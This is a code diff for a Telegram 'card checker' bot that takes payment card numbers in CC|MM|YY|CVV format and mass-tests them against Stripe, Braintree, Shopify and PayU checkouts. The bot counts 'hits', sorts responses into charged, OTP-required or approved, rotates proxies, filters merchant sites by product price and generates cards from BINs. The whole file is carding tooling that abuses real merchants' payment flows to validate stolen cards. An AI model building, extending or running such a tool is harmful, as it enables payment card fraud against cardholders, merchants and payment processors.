     def is_charged_response(self, raw: str) -> bool:
-        """True if the PayU response indicates real money was taken."""
         charged_keywords = [
             "charged successfully", "payment successful", "charge success",
             "transaction completed", "amount charged", "charged $"
         ]
         raw_lower = raw.lower()
         return any(keyword in raw_lower for keyword in charged_keywords)
-
-    def is_otp_response(self, raw: str) -> bool:
-        """True if the PayU response indicates OTP/3DS authentication required."""
-        otp_keywords = [
-            "otp", "3d secure", "3ds", "authentication required",
-            "action required", "redirect", "verify your", "one-time"
-        ]
-        raw_lower = raw.lower()
-        return any(keyword in raw_lower for keyword in otp_keywords)
-
-    def classify_payu_response(self, raw: str) -> str:
-        """Classify PayU response into CHARGED, APPROVED, OTP_REQUIRED, or DECLINED."""
-        if not raw:
-            return "DECLINED"
-        raw_lower = raw.lower()
-        if self.is_charged_response(raw):
-            return "CHARGED"
-        if self.is_otp_response(raw):
-            return "OTP_REQUIRED"
-        if self.is_approved(raw):
-            return "APPROVED"
-        return "DECLINED"
 
     def progress_bar(self, cur: int, tot: int, width: int = 20) -> str:
         if tot == 0:
@@ -2606,8 +2121,6 @@ class CardCheckerBot:
 
         while time.time() < deadline:
             await asyncio.sleep(1.0)
-            # Yield to event loop to prevent blocking bot handlers
-            await asyncio.sleep(0)
             try:
                 async for msg in self.user_client.iter_messages(PAYU_BOT_USERNAME, limit=20):
                     if msg.id <= sent_id:
@@ -2623,13 +2136,11 @@ class CardCheckerBot:
                         "loading", "wait", "fetching", "validating", "hold on"
                     ]):
                         continue
-                    logger.info(f"[PayU] Got response for {gateway} ({cmd[:15]}...): {msg.text[:80]}")
                     return msg.text
             except Exception as e:
                 logger.debug(f"PayU poll error: {e}")
                 await asyncio.sleep(1.0)
 
-        logger.warning(f"[PayU] TIMEOUT: No response for {gateway} ({cmd[:15]}...) after {CARD_CHECK_TIMEOUT}s")
         return f"Timeout: No response after {CARD_CHECK_TIMEOUT}s"
 
     def is_approved(self, resp: str) -> bool:
@@ -2748,20 +2259,37 @@ class CardCheckerBot:
         await msg.edit(final_text, parse_mode='html')
 
     async def pulse_progress(self, chat_id, msg_id, current, total, card_preview, job_id, elapsed_str,
-                             remaining_str, current_site="", current_status=""):
+                             remaining_str):
         bar = self.progress_bar(current, total)
         job = self.active_jobs.get(job_id, {})
         hits = job.get('approved_cards', [])
         hit_count = len(hits) if isinstance(hits, list) else 0
         declined = job.get('declined_count', 0)
 
-        bin_preview = card_preview[:6] + "****" if len(card_preview) >= 6 else card_preview
-        site_short = current_site.replace('https://', '').replace('http://', '')[:30] if current_site else "..."
-        status_display = current_status[:30] if current_status else "processing..."
+        # FIX: Real speed display — calculate actual cards/sec and avg time per card
+        speed_line = ""
+        try:
+            # Parse elapsed time from HH:MM:SS or MM:SS string
+            parts = elapsed_str.split(":")
+            if len(parts) == 3:
+                elapsed_secs = int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])
+            elif len(parts) == 2:
+                elapsed_secs = int(parts[0]) * 60 + int(parts[1])
+            else:
+                elapsed_secs = 0
+            if current > 0 and elapsed_secs > 0:
+                cards_per_sec = current / elapsed_secs
+                avg_per_card = elapsed_secs / current
+                cards_per_min = cards_per_sec * 60
+                speed_line = f"│  💨 Speed:     <code>{cards_per_min:.1f} cards/min</code>\n│  ⏱️ Avg:       <code>{avg_per_card:.1f}s/card</code>\n"
+            else:
+                speed_line = "│  💨 Speed:     <code>calculating...</code>\n"
+        except Exception:
+            speed_line = "│  💨 Speed:     <code>calculating...</code>\n"
 
         text = (
             "╔══════════════════════════════════════╗\n"
-            "║  🌸 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡��𝗜𝗡𝗚 ⚡         ║\n"
+            "║  🌸 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ⚡         ║\n"
             "╠══════════════════════════════════════╣\n\n"
             f"    {bar}\n\n"
             "┌──────── 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ──────────┐\n"
@@ -2769,16 +2297,16 @@ class CardCheckerBot:
             f"│  📃 Done:      <code>{current}/{total}</code>\n"
             f"│  💀 Hits:      <code>{hit_count}</code>\n"
             f"│  ❌ Declined:  <code>{declined}</code>\n"
-            f"│  💳 Current:   <code>{bin_preview}</code>\n"
-            f"│  🌐 Site:      <code>{site_short}</code>\n"
-            f"│  📡 Status:    <code>{status_display}</code>\n"
+            f"{speed_line}"
             f"│  ⏱ Elapsed:   <code>{elapsed_str}</code>\n"
             f"│  ⏳ ETA:       <code>~{remaining_str}</code>\n"
+            f"│  🔍 Current:   <code>{card_preview[:20]}…</code>\n"
             "│\n"
             "└──────────────────────────────────────┘"
         )
         await self.safe_edit_message(chat_id, msg_id, text,
-                                      buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"))
+                                     buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"))
+
     # ═══════════════════════════════════════════════
     # 👑 SAVAGE PREMIUM UI — Bot Handlers
     # ═══════════════════════════════════════════════
@@ -2916,35 +2444,8 @@ class CardCheckerBot:
                 await event.answer("❌ Admin only.", alert=True)
                 return
 
-            # ━━━━━━ STOP JOB (single or parallel) ━━━━━━
-            if data.startswith("stop_user_"):
-                # Stop ALL parallel jobs for this user
-                target_uid = int(data[10:])
-                if target_uid != uid:
-                    await event.answer("❌ Not your job.", alert=True)
-                    return
-                stopped = 0
-                agg = self.user_aggregated.get(uid, {})
-                for jid in list(self._user_job_ids.get(uid, [])):
-                    j = self.active_jobs.get(jid)
-                    if j and not j.get('stop'):
-                        j['stop'] = True
-                        stopped += 1
-                await event.answer(f"⏹ Stopping {stopped} parallel jobs...", alert=True)
-                p = agg.get('processed', 0)
-                t = agg.get('total_cards', 0)
-                hits = agg.get('approved', 0)
-                await event.edit(
-                    "╔══════════════════════════════════════╗\n"
-                    "║  ⏹ 𝗝𝗢𝗕 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🛑                ║\n"
-                    "╚══════════════════════════════╝\n\n"
-                    f"    {self.progress_bar(p, t)}\n\n"
-                    f"┃ 📃 Processed: <code>{p}/{t}</code>\n"
-                    f"┃ ✅ Hits: <code>{hits}</code>\n"
-                    f"┃ 🔀 Workers stopped: <code>{stopped}</code>",
-                    parse_mode='html')
-
-            elif data.startswith("stop_"):
+            # ━━━━━━ STOP JOB ━━━━━━
+            if data.startswith("stop_"):
                 jid = data[5:]
                 job = self.active_jobs.get(jid)
                 if job and job['user_id'] == uid and not job.get('stop'):
@@ -2966,6 +2467,8 @@ class CardCheckerBot:
 
             # ━━━━━━ SHOPIFY MENU ━━━━━━
             elif data == "shopify_menu":
+                # Cancel any pending text input mode
+                self.user_text_mode.pop(uid, None)
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
                     await event.answer("❌ Shopify access required.", alert=True)
                     return
@@ -2984,10 +2487,7 @@ class CardCheckerBot:
                     [Button.inline("💰 Low (<$5)", data="shopify_filter_low"),
                      Button.inline("💵 Med ($5-10)", data="shopify_filter_medium")],
                     [Button.inline("💎 High ($10-20)", data="shopify_filter_high"),
-                     Button.inline("💸 >$20", data="shopify_filter_vhigh")],
-                    [Button.inline("🌐 All", data="shopify_filter_all")],
-                    [Button.inline("📊 Sort Low→High", data="shopify_sort_low"),
-                     Button.inline("📊 Sort High→Low", data="shopify_sort_high")],
+                     Button.inline("🌐 All", data="shopify_filter_all")],
                     [Button.inline("📎 𝗨𝗽𝗹𝗼𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 🔗", data="shopify_upload_proxies"),
                      Button.inline("📊 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝗮𝘁𝘂𝘀 📡", data="shopify_proxy_status")],
                     [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")]
@@ -3003,9 +2503,9 @@ class CardCheckerBot:
                     f"│  🎯 Amount Filter: <code>{filter_display}</code>\n"
                     "└──────────────────────────────────────┘\n\n"
                     "┌──────── 📝 𝗨𝘀𝗮𝗴𝗲 ──────────────┐\n"
-                    "│  🌐 <code>/sp CC|MM|YY|CVV</code>\n"
-                    "│  🔗 <code>/sp CC|MM|YY|CVV proxy</code>\n"
-                    "│  🎯 <code>/sp CC|MM|YY|CVV low</code>\n"
+                    "│  1️⃣ Tap <b>Single Check</b> → send <code>CC|MM|YY|CVV</code>\n"
+                    "│  2️⃣ Tap <b>Mass Check</b>   → send <b>.txt</b> file\n"
+                    "│  3️⃣ Optional: add <code>proxy</code> to use your proxies\n"
                     "└──────────────────────────────────────┘\n\n"
                     "⚠️ <i>Upload proxies first for proxy mode</i>",
                     buttons=btns, parse_mode='html'
@@ -3014,39 +2514,29 @@ class CardCheckerBot:
             # ━━━━━━ AMOUNT FILTER SELECTION ━━━━━━
             elif data.startswith("shopify_filter_"):
                 filter_choice = data.replace("shopify_filter_", "")
-                if filter_choice in ("low", "medium", "high", "vhigh", "all"):
+                if filter_choice in ("low", "medium", "high", "all"):
                     self.user_amount_filter[uid] = filter_choice
-                    filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "vhigh": "💸 Very High (>$20)", "all": "🌐 All"}
-                    filter_range_labels = {"low": "<$5", "medium": "$5-10", "high": "$10-20", "vhigh": ">$20", "all": "all"}
+                    filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "all": "🌐 All"}
 
-                    # Instant filter: use precomputed filtered_sites
+                    # FIX: Warn if cache is incomplete for non-"all" filters
+                    if filter_choice != "all":
+                        base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
+                        uncached = [s for s in base_sites if s not in self._site_price_cache]
+                        if uncached:
+                            await event.answer(
+                                f"⚠️ {len(uncached)} sites have no cached price. Run /test_sites first for accurate filtering.",
+                                alert=True
+                            )
+                        else:
+                            await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)
+                    else:
+                        await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)
+
+                    # Pre-filter sites by amount filter (instant — no API calls)
                     try:
                         await self.rebuild_sites_by_filter(filter_choice)
                     except Exception as e:
                         logger.warning(f"Failed to rebuild sites by filter: {e}")
-
-                    # Check if the selected filter list is empty
-                    if filter_choice != "all" and not self.working_sites:
-                        await event.answer(
-                            f"⚠️ No sites with products in the {filter_range_labels[filter_choice]} range. Try a different filter.",
-                            alert=True
-                        )
-                    else:
-                        site_count = len(self.working_sites)
-                        await event.answer(f"✅ Filter set: {filter_labels[filter_choice]} ({site_count} sites)", alert=True)
-
-            # ━━━━━━ SORT BY PRICE ━━━━━━
-            elif data == "shopify_sort_low":
-                sorted_sites = sorted(self.working_sites, key=lambda s: self._site_price_cache.get(s, 999.0))
-                self.working_sites = sorted_sites
-                self.site_index = 0
-                await event.answer(f"✅ Sites sorted: Low→High ({len(sorted_sites)} sites)", alert=True)
-
-            elif data == "shopify_sort_high":
-                sorted_sites = sorted(self.working_sites, key=lambda s: self._site_price_cache.get(s, 0.0), reverse=True)
-                self.working_sites = sorted_sites
-                self.site_index = 0
-                await event.answer(f"✅ Sites sorted: High→Low ({len(sorted_sites)} sites)", alert=True)
 
             # ━━━━━━ ACTIVE JOBS & STOP ━━━━━━
             elif data == "shopify_active_jobs":
@@ -3089,16 +2579,17 @@ class CardCheckerBot:
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
                     await event.answer("❌ Shopify access required.", alert=True)
                     return
+                self.user_text_mode[uid] = 'single_shopify'
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
                     "║  💳 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗦𝗜𝗡𝗚𝗟𝗘 𝗞𝗜𝗟𝗟 🎯   ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
-                    "┌──────── 🌐 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗠𝗼𝗱𝗲 ───────┐\n"
-                    "│  <code>/sp 4601860005184553|03|28|478</code>\n"
-                    "└──────────────────────────────────────┘\n\n"
+                    "💳 <b>Send your card now:</b>\n"
+                    "<code>4601860005184553|03|28|478</code>\n\n"
                     "┌──────── 🔗 𝗣𝗿𝗼𝘅𝘆 𝗠𝗼𝗱𝗲 ─────────┐\n"
-                    "│  <code>/sp 4601860005184553|03|28|478 proxy</code>\n"
+                    "│  Add <code>proxy</code> after card to use your proxies:\n"
+                    "│  <code>4601860005184553|03|28|478 proxy</code>\n"
                     "└──────────────────────────────────────┘",
                     parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                 )
@@ -3188,25 +2679,29 @@ class CardCheckerBot:
 
             # ━━━━━━ STRIPE / BRAINTREE MENUS ━━━━━━
             elif data == "mode_single":
+                self.user_text_mode[uid] = 'single_stripe'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    "║   ⚡ STRIPE — SINGLE         ║\n"
+                    "║   ⚡ STRIPE — SINGLE 🗡️      ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
-                    "📤 <code>/st 4601860005184553|03|28|478</code>\n\n"
-                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
+                    "💳 <b>Send your card now:</b>\n"
+                    "<code>4601860005184553|03|28|478</code>\n\n"
+                    "🌐 <b>Mode:</b> <code>Direct Engine ⚡</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
 
             elif data == "mode_bt_single":
+                self.user_text_mode[uid] = 'single_braintree'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
-                    "║   🌐 BRAINTREE — SINGLE      ║\n"
+                    "║   🌐 BRAINTREE — SINGLE 💉   ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
-                    "📤 <code>/bt 4601860005184553|03|28|478</code>\n\n"
-                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
+                    "💳 <b>Send your card now:</b>\n"
+                    "<code>4601860005184553|03|28|478</code>\n\n"
+                    "🌐 <b>Mode:</b> <code>Direct Engine 🌐</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
@@ -3251,49 +2746,58 @@ class CardCheckerBot:
                     "╔══════════════════════════════╗\n"
                     "║      ℹ️ HELP CENTER           ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    "┏━━━━━ ⚡ Gateways ━━━━━━━━━━┓\n"
-                    "┃ <code>/st CC|MM|YY|CVV</code> — Stripe\n"
-                    "┃ <code>/bt CC|MM|YY|CVV</code> — Braintree\n"
-                    "┃ <code>/sp CC|MM|YY|CVV</code> — Shopify\n"
+                    "┏━━━━━ ⚡ Single Check ━━━━━━━┓\n"
+                    "┃ 1️⃣ Tap <b>Stripe / Braintree / Shopify</b>\n"
+                    "┃ 2️⃣ Tap <b>Single Check</b> button\n"
+                    "┃ 3️⃣ Send card: <code>CC|MM|YY|CVV</code>\n"
+                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
+                    "┏━━━━━ 📃 Mass Check ━━━━━━━━┓\n"
+                    "┃ 1️⃣ Tap <b>Mass Check</b> button\n"
+                    "┃ 2️⃣ Send a <b>.txt</b> file (one card per line)\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                     "┏━━━━━ 🛠 Utilities ━━━━━━━━━━┓\n"
-                    "┃ <code>/myaccount</code>  — Account info\n"
-                    "┃ <code>/bin 424242</code> — BIN lookup\n"
-                    "┃ <code>/generate 1000 424242</code>\n"
-                    "┃ <code>/redeem CODE</code> — Redeem key\n"
+                    "┃ 🔍 <b>BIN</b> — Tap BIN button, send 6-8 digits\n"
+                    "┃ 🎴 <b>Gen</b> — Tap Generator, send count [BIN]\n"
+                    "┃ 🎟️ <b>Redeem</b> — Tap Redeem, send code\n"
+                    "┃ 👤 <b>Account</b> — View stats & expiry\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                 )
                 await event.answer()
 
             elif data == "bin_search":
+                self.user_text_mode[uid] = 'bin'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
                     "║      🔍 BIN LOOKUP           ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    "📤 Send: <code>/bin 424242</code>",
+                    "📤 <b>Send your BIN (6–8 digits):</b>\n"
+                    "<code>424242</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
 
             elif data == "card_gen":
+                self.user_text_mode[uid] = 'gen'
                 await event.edit(
                     "╔══════════════════════════════╗\n"
                     "║      🎴 CARD GENERATOR       ║\n"
                     "╚══════════════════════════════╝\n\n"
                     "┏━━━━━ 📝 Usage ━━━━━━━━━━━━┓\n"
-                    "┃ <code>/generate 1000</code>        Random\n"
-                    "┃ <code>/generate 1000 424242</code> Custom\n"
+                    "┃ <b>Send:</b> <code>1000</code>           (random BIN)\n"
+                    "┃ <b>Send:</b> <code>1000 424242</code>    (custom BIN)\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
 
             elif data == "redeem_menu":
+                self.user_text_mode[uid] = 'redeem'
                 await event.edit(
                     "╔══════════════════════════════════════╗\n"
                     "║  🎟️ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘 🔑                ║\n"
                     "╚══════════════════════════════╝\n\n"
-                    "📤 Send: <code>/redeem YOUR_CODE</code>",
+                    "🔑 <b>Send your code:</b>\n"
+                    "<code>ABC123</code>",
                     parse_mode='html',
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                 )
@@ -3350,8 +2854,6 @@ class CardCheckerBot:
                     [Button.inline("✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 👤", data="shopify_approve_prompt"),
                      Button.inline("❌ 𝗥𝗲𝘃𝗼𝗸𝗲 🚫", data="shopify_revoke_prompt")],
                     [Button.inline("🔍 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀 (𝗔𝗣𝗜) ⚡", data="shopify_test_sites")],
-                    [Button.inline("💰 𝗥𝗲𝗳𝗿𝗲𝘀𝗵 𝗣𝗿𝗶𝗰𝗲𝘀 🔄", data="shopify_refresh_prices"),
-                     Button.inline("📂 𝗟𝗼𝗮𝗱 𝗦𝗶𝘁𝗲𝘀 📥", data="shopify_load_working_sites")],
                     [Button.inline(f"✨ Use Only Good Sites ({good_count})", data="shopify_use_good_sites")],
                     [Button.inline("🎟️ Mass Gen Codes (up to 50)", data="shopify_mass_gencode_menu")],
                     [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")]
@@ -3371,119 +2873,63 @@ class CardCheckerBot:
                 )
 
             elif data == "shopify_test_sites":
-                # Admin-only: run STRICT API-based site tester and auto-load working sites
+                # Admin-only: run API site tester and auto-load working sites
                 if uid not in ADMINS:
                     await event.answer("🔒 Admin only.", alert=True)
                     return
-                progress_msg = await event.edit(
+                await event.edit(
                     "╔══════════════════════════════════════╗\n"
                     "║  🔍 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦... ⏳             ║\n"
                     "╠══════════════════════════════════════╣\n\n"
                     f"┃ Testing <code>{len(self.owner_sites)}</code> sites via API...\n"
-                    f"┃ 📋 Concurrency=2, 3s delay, exponential backoff.\n"
-                    "┃ 429/503 = retry with backoff. Dead markers = dead.\n"
+                    f"┃ ⚡ Concurrent ({SITE_TEST_CONCURRENCY_LIMIT} parallel) + retry on 503.\n"
+                    "┃ This may take a few minutes.\n"
                     "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                     parse_mode='html'
                 )
-
-                async def site_test_progress(tested, total, working_c, dead_c, unstable_c, latest_site, latest_status, country="", price=0.0, gateway=""):
-                    try:
-                        bar = self.progress_bar(tested, total)
-                        price_str = f"${price:.2f}" if price and price > 0 else "N/A"
-                        gw_str = gateway if gateway else "N/A"
-                        country_str = country if country else "N/A"
-                        text = (
-                            "╔══════════════════════════════════════╗\n"
-                            "║  🔍 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦... ⏳             ║\n"
-                            "╠══════════════════════════════════════╣\n\n"
-                            f"    {bar}\n\n"
-                            f"┃ 🔍 Testing: <code>{tested}/{total}</code>\n"
-                            f"┃ ✅ Working: <code>{working_c}</code> | ❌ Dead: <code>{dead_c}</code> | ⏳ Unstable: <code>{unstable_c}</code>\n"
-                            f"┃ Latest: <code>{latest_site[:30]}</code> ({country_str}) – {price_str} – {gw_str} – {latest_status}\n"
-                            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
-                        )
-                        await self.safe_edit_message(event.chat_id, progress_msg.id, text)
-                    except Exception:
-                        pass
-
                 try:
                     sites = list(self.owner_sites) if self.owner_sites else []
-                    working, dead = await self.test_sites_graphql(sites, progress_callback=site_test_progress)
+                    working, dead = await self.test_sites_graphql(sites)
                     # Auto-load working sites
                     loaded = self.load_working_sites_from_file()
+                    # FIX: If 0 working sites found, fall back to all owner_sites
                     fallback_msg = ""
-                    if loaded == 0:
-                        fallback_msg = "\n⚠️ <i>No working sites found. Mass checks will not proceed until sites pass testing.</i>"
-                        logger.warning(f"⚠️ Site test found 0 working sites")
+                    if loaded == 0 and self.owner_sites:
+                        self.working_sites = list(self.owner_sites)
+                        self.site_index = 0
+                        self.dead_sites = set()
+                        loaded = len(self.working_sites)
+                        fallback_msg = "\n⚠️ <i>No tested sites passed — using ALL owner sites as fallback.</i>"
+                        logger.warning(f"⚠️ Site test found 0 working — falling back to {loaded} owner_sites")
 
-                    # Precompute filtered site lists for instant amount filtering
-                    self.precompute_filtered_sites()
-
-                    # Build working sites table (first 20) with Country, Price, Gateway
+                    # Build working sites preview
                     working_preview = ""
                     if working:
-                        table_lines = []
-                        for i, site in enumerate(working[:20], 1):
-                            site_short = self.normalize_site_url(site).replace('https://', '')
-                            price = self._site_price_cache.get(site, 0)
-                            price_str = f"${price:.2f}" if price > 0 else "N/A"
-                            country = self._country_from_domain(site)
-                            gw = self._site_gateway_cache.get(site, "N/A")
-                            table_lines.append(f"┃ {i}. <code>{site_short[:20]}</code> | {country} | {price_str} | {gw}")
-                        if len(working) > 20:
-                            table_lines.append(f"┃ ... and {len(working) - 20} more")
-                        working_preview = f"\n\n┏━━━ # | Site | Country | Price | Gateway ━━━┓\n" + "\n".join(table_lines) + "\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
+                        sample = working[:5]
+                        working_preview = "\n".join([f"┃ ✅ <code>{self.normalize_site_url(s).replace('https://', '')}</code>" for s in sample])
+                        if len(working) > 5:
+                            working_preview += f"\n┃ ... and {len(working) - 5} more"
+                        working_preview = f"\n\n┏━━━ Working sites (sample) ━━━┓\n{working_preview}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
 
-                    # Save full working sites list as downloadable file
-                    full_list_file = None
-                    if working:
-                        try:
-                            full_list_path = "working_sites_full.txt"
-                            with open(full_list_path, "w") as fl:
-                                fl.write("# | Site | Country | Price | Gateway | Status\n")
-                                fl.write("=" * 60 + "\n")
-                                for i, site in enumerate(working, 1):
-                                    site_short = self.normalize_site_url(site).replace('https://', '')
-                                    price = self._site_price_cache.get(site, 0)
-                                    price_str = f"${price:.2f}" if price > 0 else "N/A"
-                                    country = self._country_from_domain(site)
-                                    gw = self._site_gateway_cache.get(site, "N/A")
-                                    fl.write(f"{i} | {site_short} | {country} | {price_str} | {gw} | WORKING\n")
-                            full_list_file = full_list_path
-                        except Exception:
-                            pass
-
-                    cached_prices = sum(1 for s in self.working_sites if s in self._site_price_cache)
-                    unstable_count = len(self.unstable_sites)
-                    unstable_line = f"\n┃ ⏳ Unstable: <code>{unstable_count}</code> (will retest later)" if unstable_count > 0 else ""
-
-                    await self.safe_edit_message(event.chat_id, progress_msg.id,
+                    await event.edit(
                         "╔══════════════════════════════════════╗\n"
                         "║  🔍 𝗦𝗜𝗧𝗘 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅         ║\n"
                         "╠══════════════════════════════════════╣\n\n"
-                        f"┃ ✅ Working: <code>{len(working)}</code> (strict: real payment response)\n"
-                        f"┃ ❌ Dead:    <code>{len(dead)}</code>{unstable_line}\n"
+                        f"┃ ✅ Working: <code>{len(working)}</code>\n"
+                        f"┃ ✨ Good:    <code>{len(self.good_sites)}</code> (real payment responses)\n"
+                        f"┃ ❌ Dead:    <code>{len(dead)}</code>\n"
                         f"┃ 📦 Loaded:  <code>{loaded}</code> sites activated\n"
-                        f"┃ 💰 Prices:  <code>{cached_prices}/{loaded}</code> cached\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                         f"{working_preview}\n\n"
-                        f"💎 <i>Only verified payment sites loaded for mass checks.</i>{fallback_msg}\n"
+                        f"💎 <i>Only fully verified sites loaded for mass checks.</i>{fallback_msg}\n"
                         "📋 <i>Check bot logs for per-site failure details.</i>",
+                        parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
-                    # Send full working sites list as downloadable file
-                    if full_list_file and os.path.exists(full_list_file):
-                        try:
-                            await self.bot_client.send_file(
-                                event.chat_id, full_list_file,
-                                caption=f"📥 Full working sites list ({len(working)} sites)",
-                                parse_mode='html'
-                            )
-                        except Exception:
-                            pass
                 except Exception as e:
-                    await self.safe_edit_message(event.chat_id, progress_msg.id,
+                    await event.edit(
                         f"❌ Site test failed: <code>{str(e)[:100]}</code>",
+                        parse_mode='html',
                         buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                     )
 
@@ -3508,98 +2954,22 @@ class CardCheckerBot:
                     buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                 )
 
-            # ━━━━━━ REFRESH PRICES (button) ━━━━━━
-            elif data == "shopify_refresh_prices":
-                if uid not in ADMINS:
-                    await event.answer("🔒 Admin only.", alert=True)
-                    return
-                sites = list(self.working_sites)
-                if not sites:
-                    await event.edit(
-                        "❌ No working sites. Run <b>Test Sites</b> first.",
-                        parse_mode='html',
-                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
-                    )
-                    return
-                await event.edit(
-                    f"🔄 Refreshing prices for <code>{len(sites)}</code> sites...\n"
-                    "⏳ Fetching cheapest products without re-testing.",
-                    parse_mode='html'
-                )
-                try:
-                    old_count = len(self._site_price_cache)
-                    self._site_price_cache.clear()
-                    await self.prefetch_site_prices()
-                    new_count = len(self._site_price_cache)
-                    if self._site_price_cache:
-                        with open("site_prices.json", "w") as f:
-                            json.dump(self._site_price_cache, f)
-                    self.precompute_filtered_sites()
-                    await event.edit(
-                        "╔══════════════════════════════════════╗\n"
-                        "║  💰 𝗣𝗥𝗜𝗖𝗘 𝗥𝗘𝗙𝗥𝗘𝗦𝗛 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅    ║\n"
-                        "╠══════════════════════════════════════╣\n\n"
-                        f"┃ 📊 Old cache: <code>{old_count}</code> sites\n"
-                        f"┃ 📊 New cache: <code>{new_count}</code> sites\n"
-                        f"┃ 💾 Saved to <code>site_prices.json</code>\n"
-                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
-                        parse_mode='html',
-                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
-                    )
-                except Exception as e:
-                    await event.edit(
-                        f"❌ Price refresh failed: <code>{str(e)[:100]}</code>",
-                        parse_mode='html',
-                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
-                    )
-
-            # ━━━━━━ LOAD WORKING SITES (button) ━━━━━━
-            elif data == "shopify_load_working_sites":
-                if uid not in ADMINS:
-                    await event.answer("🔒 Admin only.", alert=True)
-                    return
-                count = self.load_working_sites_from_file()
-                if count > 0:
-                    self._sites_ready = True
-                    self.precompute_filtered_sites()
-                    await event.edit(
-                        "╔══════════════════════════════════════╗\n"
-                        "║  📂 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ✅      ║\n"
-                        "╠══════════════════════════════════════╣\n\n"
-                        f"┃ ✅ Loaded: <code>{count}</code> working sites\n"
-                        "┃ 🔄 Active site list replaced.\n"
-                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
-                        parse_mode='html',
-                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
-                    )
-                else:
-                    await event.edit(
-                        "❌ No working sites file found or file is empty.\n"
-                        "Run <b>Test Sites</b> first.",
-                        parse_mode='html',
-                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
-                    )
-
             # ━━━━━━ USE ONLY GOOD SITES ━━━━━━
             elif data == "shopify_use_good_sites":
                 if uid not in ADMINS:
